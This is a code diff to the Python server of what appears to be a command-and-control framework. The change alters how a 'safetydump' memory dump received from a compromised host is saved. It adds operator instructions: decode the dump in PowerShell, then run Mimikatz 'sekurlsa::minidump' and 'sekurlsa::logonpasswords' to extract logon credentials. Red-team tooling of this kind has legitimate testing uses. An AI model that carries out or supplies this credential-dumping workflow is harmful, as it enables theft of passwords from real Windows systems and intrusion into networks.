@@ -482,13 +482,23 @@ class MyHandler(BaseHTTPRequestHandler):
 
                     elif "safetydump" in executedCmd.lower():
                         rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
-                        if rawoutput.startswith("[-]"):
+                        if rawoutput.startswith("[-]") or rawoutput.startswith("ErrorCmd"):
                             update_task(taskId, rawoutput)
                             print(rawoutput)
                         else:
-                            dumppath = "%sSafetyDump-Task-%s.bin" % (DownloadsDirectory, taskIdStr)
-                            open(dumppath, 'wb').write(base64.b64decode(rawoutput))
+                            dumpname = "SafetyDump-Task-%s.b64" % taskIdStr
+                            dumppath = "%s%s" % (DownloadsDirectory, dumpname)
+                            open(dumppath, 'w').write(rawoutput)
                             message = "Dump written to: %s" % dumppath
+                            message = message + "\n The base64 blob needs decoding on Windows and then Mimikatz can be run against it."
+                            message = message + "\n E.g:"
+                            message = message + "\n     $filename = '.\%s'" % dumpname
+                            message = message + "\n     $b64 = Get-Content $filename"
+                            message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
+                            message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + 'safetydump.dmp', $bytes)"
+                            message = message + "\n     ./mimikatz.exe"
+                            message = message + "\n     sekurlsa::minidump safetydump.dmp"
+                            message = message + "\n     sekurlsa::logonpasswords"
                             update_task(taskId, message)
                             print(message)
 
@@ -718,7 +728,7 @@ if __name__ == '__main__':
                 httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="%sposh.key" % ROOTDIR, certfile="%sposh.crt" % ROOTDIR, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
         else:
             raise ValueError("Cannot find the certificate files")
-    
+
     c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
     c2_message_thread.start()
 
